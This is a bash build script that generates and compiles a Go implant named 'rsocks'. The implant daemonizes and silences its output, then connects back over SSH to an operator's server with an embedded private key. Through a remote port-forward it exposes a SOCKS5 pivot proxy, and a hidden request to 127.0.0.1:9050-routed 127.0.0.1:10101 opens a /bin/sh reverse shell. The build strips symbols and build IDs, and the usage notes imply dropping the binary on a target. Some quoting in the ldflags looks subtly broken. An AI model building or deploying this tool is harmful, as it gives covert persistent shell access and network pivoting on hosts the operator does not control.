#!/usr/bin/env bash
##################################################################
#             RRRR    SSSS   OOO   CCCC  K   K  SSSS             #
#             R   R  S      O   O C      K  K  S                 #
#             RRRR    SSS   O   O C      KKK    SSS              #
#             R  R       S  O   O C      K  K      S             #
#             R   R  SSSS    OOO   CCCC  K   K SSSS              #
##################################################################
#                                                                #
# Required: GCC and Golang on $PATH                              #
#                                                                #
#   go  version 1.24.5                                           #
#   gcc version 13.3.0                                           #
#                                                                #
##################################################################
#                                                                #
# Usage:                                                         #
#                                                                #
#   ssh-keygen -f rsocks_id_rsa -N ''                            #
#   bash ./rsocks.sh ./rsocks_id_rsa 10.10.95.67:22 username     #
#   # waves hands - get's binary where desired                   #
#   ./rsocks                                                     #
#                                                                #
##################################################################

set -eo pipefail

CGO_ENABLED=1
GOOS=linux
GOARCH=amd64
CC=gcc

BUILD_DIR=`mktemp -d`
FILENAME="rsocks"
PRIVATE_KEY_FILE=`realpath -L "${1}"`
SSH_ADDR="${2}"
USERNAME="${3}"

if [[ -z "$USERNAME" ]]; then
    echo "Error: You must provide a USERNAME for SSH"
    exit 1
fi

if [[ ! -f "${PRIVATE_KEY_FILE}" ]]; then
  echo "[!] Missing private key: ${PRIVATE_KEY_FILE}"
  exit 1
fi

# Check if argument is empty
if [[ -z "$SSH_ADDR" ]]; then
    echo "Error: You must provide a host/IP and port (format: host:port)"
    exit 1
fi

# Extract host and port
if [[ "$SSH_ADDR" =~ ^\[(.*)\]:(.+)$ ]]; then
    # IPv6 case: [IPv6]:port
    host="${BASH_REMATCH[1]}"
    port="${BASH_REMATCH[2]}"
else
    # IPv4 or hostname/FQDN case: host:port
    host="${SSH_ADDR%%:*}"
    port="${SSH_ADDR##*:}"
fi

# Validate port number
if ! [[ "$port" =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
    echo "Error: Invalid port number '$port'. Must be 1-65535."
    exit 1
fi

# Validate host
ipv4_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
hostname_regex="^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z]{2,63}$"

if [[ "$host" =~ $ipv4_regex ]]; then
    # Check that each IPv4 octet is 0-255
    IFS='.' read -r o1 o2 o3 o4 <<< "$host"
    for octet in "$o1" "$o2" "$o3" "$o4"; do
        if (( octet < 0 || octet > 255 )); then
            echo "Error: Invalid IPv4 address '$host'"
            exit 1
        fi
    done
elif ! [[ "$host" =~ $hostname_regex ]]; then
    echo "Error: Invalid hostname '$host'"
    exit 1
fi

echo "Host and port are valid: $host:$port"

pushd "${BUILD_DIR}"

cat > go.mod << 'EOF'
module rsocks

go 1.24.5

require golang.org/x/crypto v0.46.0

require (
	github.com/creack/pty v1.1.24
	golang.org/x/sys v0.39.0 // indirect
)
EOF

cat > go.sum << 'EOF'
github.com/creack/pty v1.1.24 h1:bJrF4RRfyJnbTJqzRLHzcGaZK1NeM5kTC9jGgovnR1s=
github.com/creack/pty v1.1.24/go.mod h1:08sCNb52WyoAwi2QDyzUCTgcvVFhUzewun7wtTfvcwE=
golang.org/x/crypto v0.46.0 h1:cKRW/pmt1pKAfetfu+RCEvjvZkA9RimPbh7bhFjGVBU=
golang.org/x/crypto v0.46.0/go.mod h1:Evb/oLKmMraqjZ2iQTwDwvCtJkczlDuTmdJXoZVzqU0=
golang.org/x/sys v0.39.0 h1:CvCKL8MeisomCi6qNZ+wbb0DN9E5AATixKsvNtMoMFk=
golang.org/x/sys v0.39.0/go.mod h1:OgkHotnGiDImocRcuBABYBEXf8A9a87e/uXjp9XT3ks=
golang.org/x/term v0.38.0 h1:PQ5pkm/rLO6HnxFR7N2lJHOZX6Kez5Y1gDSJla6jo7Q=
golang.org/x/term v0.38.0/go.mod h1:bSEAKrOT1W+VSu9TSCMtoGEOUcKxOKgl3LE5QEF/xVg=
EOF

cat > main.go << 'EOF'
package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

// build time injected ; )
var (
	sshPrivateKeyString     string
	sshAddrString           string
	sshUserString           string
	sshRemoteSockAddrString string
)

// configuration options
var (
	sshAddr       = env("RS_SSH_ADDR", sshAddrString)
	sshUser       = env("RS_SSH_USER", sshUserString)
	sshPrivateKey = env("RS_SSH_PKEY", sshPrivateKeyString)
	remoteSocks   = strings.Split(env("RS_REMOTE_SOCKS", sshRemoteSockAddrString), ",")

	keepaliveInterval = time.Duration(envInt("RS_KEEPALIVE_SEC", 30)) * time.Second
	keepaliveFails    = envInt("RS_KEEPALIVE_FAILS", 3)

	initialBackoff = time.Duration(envInt("RS_BACKOFF_INITIAL", 2)) * time.Second
	maxBackoff     = time.Duration(envInt("RS_BACKOFF_MAX", 60)) * time.Second
)

func main() {
	isDebug := strings.HasPrefix(os.Args[0], os.TempDir())

	if !isDebug && os.Getenv("RS_DAEMONIZED") == "" {
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Env = append(os.Environ(), "RS_DAEMONIZED=1")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true,
		}

		if err := cmd.Start(); err != nil {
			log.Fatal("Failed to daemonize:", err)
		}

		// Parent exits
		os.Exit(0)
	}

	if os.Getenv("RS_DAEMONIZED") == "1" {
		os.Chdir("/")
		syscall.Umask(0)

		null, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
		if err == nil {
			syscall.Dup2(int(null.Fd()), int(os.Stdin.Fd()))
			syscall.Dup2(int(null.Fd()), int(os.Stdout.Fd()))
			syscall.Dup2(int(null.Fd()), int(os.Stderr.Fd()))
			null.Close()
		}
	} else if isDebug {
		log.Println("[debug] running in foreground")
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	signer, err := loadKey()
	if err != nil {
		log.Fatal(err)
	}

	hostKeyCB, err := knownHostsCallback()
	if err != nil {
		log.Fatal(err)
	}

	cfg := &ssh.ClientConfig{
		User:            sshUser,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		HostKeyCallback: hostKeyCB,
		Timeout:         10 * time.Second,
	}

	backoff := initialBackoff

	for ctx.Err() == nil {
		log.Println("Connecting to SSH:", sshAddr)

		client, err := ssh.Dial("tcp", sshAddr, cfg)
		if err != nil {
			log.Println("SSH connect failed:", err)
			sleep(ctx, backoff)
			backoff = min(backoff*2, maxBackoff)
			continue
		}

		log.Println("SSH connected")
		backoff = initialBackoff

		sshClientForPTY = client // Store client for PTY sessions

		sessCtx, cancel := context.WithCancel(ctx)
		errCh := make(chan error, 1)

		go sshKeepalive(sessCtx, client, keepaliveInterval, keepaliveFails, errCh)

		for _, addr := range remoteSocks {
			addr = strings.TrimSpace(addr)
			if addr != "" {
				go superviseListener(sessCtx, client, addr)
			}
		}

		select {
		case err := <-errCh:
			log.Println("SSH failure:", err)
		case <-ctx.Done():
		}

		cancel()
		client.Close()
		sshClientForPTY = nil

		if ctx.Err() != nil {
			break
		}

		sleep(ctx, backoff)
		backoff = min(backoff*2, maxBackoff)
	}

	log.Println("Shutting down")
}

var pinnedHostKey ssh.PublicKey // Store the first host key we see

func loadKey() (ssh.Signer, error) {

	if v := os.Getenv("RS_SSH_KEY_CONTENT"); v != "" {
		signer, err := ssh.ParsePrivateKey([]byte(v))
		if err != nil {
			return nil, fmt.Errorf("parse env key: %w", err)
		}
		return signer, nil
	}
	if sshPrivateKey != "" {
		signer, err := ssh.ParsePrivateKey([]byte(sshPrivateKey))
		if err != nil {
			return nil, fmt.Errorf("parse embedded key: %w", err)
		}
		return signer, nil
	}
	return nil, fmt.Errorf("no SSH private key configured")
}

func knownHostsCallback() (ssh.HostKeyCallback, error) {
	// TOFU
	return func(_ string, _ net.Addr, presented ssh.PublicKey) error {
		if pinnedHostKey == nil {
			pinnedHostKey = presented
			log.Printf("Pinned host key: %s", ssh.FingerprintSHA256(presented))
			return nil
		}

		if string(presented.Marshal()) == string(pinnedHostKey.Marshal()) {
			return nil
		}

		return fmt.Errorf("host key mismatch: expected %s, got %s",
			ssh.FingerprintSHA256(pinnedHostKey),
			ssh.FingerprintSHA256(presented))
	}, nil
}

func parseHostKey(keyStr string) (ssh.PublicKey, error) {
	keyStr = strings.TrimSpace(keyStr)
	pubKey, _, _, _, err := ssh.ParseAuthorizedKey([]byte(keyStr))
	if err != nil {
		return nil, err
	}
	return pubKey, nil
}

func sshKeepalive(ctx context.Context, c *ssh.Client, interval time.Duration, maxFails int, errCh chan<- error) {
	t := time.NewTicker(interval)
	defer t.Stop()

	fail := 0
	for {
		select {
		case <-t.C:
			if _, _, err := c.SendRequest("keepalive@openssh.com", true, nil); err != nil {
				fail++
				log.Printf("Keepalive failed (%d/%d): %v", fail, maxFails, err)
				if fail >= maxFails {
					select {
					case errCh <- fmt.Errorf("keepalive failed %d times: %w", maxFails, err):
					default:
					}
					return
				}
			} else {
				fail = 0
			}
		case <-ctx.Done():
			return
		}
	}
}

func superviseListener(ctx context.Context, client *ssh.Client, addr string) {
	log.Printf("Starting listener supervision for %s", addr)
	for ctx.Err() == nil {
		ln, err := client.Listen("tcp", addr)
		if err != nil {
			log.Printf("Failed to listen on %s: %v", addr, err)
			sleep(ctx, 2*time.Second)
			continue
		}
		log.Printf("Listening on remote %s", addr)
		acceptLoop(ctx, ln)
		ln.Close()
	}
	log.Printf("Listener supervision ended for %s", addr)
}

func acceptLoop(ctx context.Context, ln net.Listener) {
	for ctx.Err() == nil {
		c, err := ln.Accept()
		if err != nil {
			if ctx.Err() == nil {
				log.Printf("Accept error: %v", err)
			}
			return
		}
		go handleSOCKS(c)
	}
}

var sshClientForPTY *ssh.Client // Shared SSH client for PTY sessions

func handleSOCKS(c net.Conn) {
	defer c.Close()

	if err := handleSOCKSInternal(c); err != nil && !isClosedError(err) && err != io.EOF {
		log.Printf("SOCKS error from %s: %v", c.RemoteAddr(), err)
	}
}

func handleSOCKSInternal(c net.Conn) error {
	c.SetDeadline(time.Now().Add(30 * time.Second))
	defer c.SetDeadline(time.Time{})

	buf := make([]byte, 262)

	// Read version and auth methods
	if _, err := io.ReadFull(c, buf[:2]); err != nil {
		return fmt.Errorf("read version: %w", err)
	}
	if buf[0] != 0x05 {
		return fmt.Errorf("unsupported SOCKS version: %d", buf[0])
	}

	nMethods := int(buf[1])
	if _, err := io.ReadFull(c, buf[:nMethods]); err != nil {
		return fmt.Errorf("read auth methods: %w", err)
	}

	// Send no auth required
	if _, err := c.Write([]byte{0x05, 0x00}); err != nil {
		return fmt.Errorf("write auth response: %w", err)
	}

	// Read request
	if _, err := io.ReadFull(c, buf[:4]); err != nil {
		return fmt.Errorf("read request header: %w", err)
	}

	if buf[1] != 0x01 { // CONNECT command
		sendSOCKSError(c, 0x07) // Command not supported
		return fmt.Errorf("unsupported command: %d", buf[1])
	}

	// Parse destination
	var host string
	var isIPv4 bool
	switch buf[3] {
	case 0x01: // IPv4
		if _, err := io.ReadFull(c, buf[:4]); err != nil {
			return fmt.Errorf("read IPv4: %w", err)
		}
		host = net.IP(buf[:4]).String()
		isIPv4 = true
	case 0x03: // Domain
		if _, err := io.ReadFull(c, buf[:1]); err != nil {
			return fmt.Errorf("read domain length: %w", err)
		}
		domainLen := int(buf[0])
		if _, err := io.ReadFull(c, buf[:domainLen]); err != nil {
			return fmt.Errorf("read domain: %w", err)
		}
		host = string(buf[:domainLen])
	case 0x04: // IPv6
		if _, err := io.ReadFull(c, buf[:16]); err != nil {
			return fmt.Errorf("read IPv6: %w", err)
		}
		host = net.IP(buf[:16]).String()
	default:
		sendSOCKSError(c, 0x08) // Address type not supported
		return fmt.Errorf("unsupported address type: %d", buf[3])
	}

	// Read port
	if _, err := io.ReadFull(c, buf[:2]); err != nil {
		return fmt.Errorf("read port: %w", err)
	}
	port := binary.BigEndian.Uint16(buf[:2])

	// Check if this is a PTY request (127.0.0.1:10101)
	if isIPv4 && host == "127.0.0.1" && port == 10101 {
		if err := sendSOCKSSuccess(c); err != nil {
			return fmt.Errorf("send success: %w", err)
		}
		return handlePTY(c)
	}

	// Connect to destination
	target := net.JoinHostPort(host, fmt.Sprintf("%d", port))
	dst, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		sendSOCKSError(c, 0x04) // Host unreachable
		return fmt.Errorf("connect to %s: %w", target, err)
	}
	defer dst.Close()

	// Send success
	if err := sendSOCKSSuccess(c); err != nil {
		return fmt.Errorf("send success: %w", err)
	}

	// Proxy data
	return proxyData(c, dst)
}

func sendSOCKSError(c net.Conn, code byte) {
	c.Write([]byte{0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
}

func sendSOCKSSuccess(c net.Conn) error {
	a := c.LocalAddr().(*net.TCPAddr)
	ip := a.IP.To4()
	if ip == nil {
		ip = net.IPv4(127, 0, 0, 1)
	}
	resp := []byte{0x05, 0x00, 0x00, 0x01, ip[0], ip[1], ip[2], ip[3], 0, 0}
	binary.BigEndian.PutUint16(resp[8:], uint16(a.Port))
	_, err := c.Write(resp)
	return err
}

func proxyData(client, server net.Conn) error {
	errCh := make(chan error, 2)

	go func() {
		_, err := io.Copy(server, client)
		if err != nil && !isClosedError(err) {
			errCh <- fmt.Errorf("client->server: %w", err)
		} else {
			errCh <- nil
		}
		// Try to close write side if supported
		if closer, ok := server.(interface{ CloseWrite() error }); ok {
			closer.CloseWrite()
		}
	}()

	go func() {
		_, err := io.Copy(client, server)
		if err != nil && !isClosedError(err) {
			errCh <- fmt.Errorf("server->client: %w", err)
		} else {
			errCh <- nil
		}
		// Try to close write side if supported
		if closer, ok := client.(interface{ CloseWrite() error }); ok {
			closer.CloseWrite()
		}
	}()

	// Wait for both directions to complete
	err1 := <-errCh
	err2 := <-errCh

	if err1 != nil {
		return err1
	}
	return err2
}

func isClosedError(err error) bool {
	if err == nil {
		return false
	}
	if err == io.EOF {
		return true
	}
	s := err.Error()
	return strings.Contains(s, "use of closed network connection") ||
		strings.Contains(s, "broken pipe") ||
		strings.Contains(s, "connection reset")
}

// handlePTY sets up a PTY locally for a shell or binary and connects it to the SOCKS client.
func handlePTY(c net.Conn) error {
	// Open a local PTY
	ptmx, tty, err := pty.Open()
	if err != nil {
		return fmt.Errorf("failed to open PTY: %w", err)
	}
	defer ptmx.Close()
	defer tty.Close()

	// Start a local shell (or your binary)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = tty
	cmd.Stdout = tty
	cmd.Stderr = tty

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true,
	}

	// Start the command
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	// Pipe PTY <-> SOCKS client
	go io.Copy(c, ptmx)
	go io.Copy(ptmx, c)

	// Wait for the command to finish
	return cmd.Wait()
}

func env(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func envInt(k string, d int) int {
	if v := os.Getenv(k); v != "" {
		if i, err := strconv.Atoi(v); err == nil {
			return i
		}
	}
	return d
}

func sleep(ctx context.Context, d time.Duration) {
	select {
	case <-time.After(d):
	case <-ctx.Done():
	}
}
EOF

  go build \
    -buildmode=pie \
    -trimpath \
    -tags netgo \
    -ldflags="-buildid= \
      -s \
      -w \
      -linkmode=external \
      -extldflags '-static' \
      -X 'main.sshPrivateKeyString=`< ${PRIVATE_KEY_FILE}`' \
      -X 'main.sshRemoteSockAddrString=0.0.0.0:9050' \
      -X 'main.sshAddrString=$host:$port' \
      -X 'main.sshUserString=${$USERNAME}' \
    " \
    -o "$FILENAME" \
    main.go

  objcopy --remove-section=.note.gnu.build-id "$FILENAME"

  echo "Built: ./${FILENAME}"
popd

mv "${BUILD_DIR}/${FILENAME}" .
rm -rf "${BUILD_DIR}"
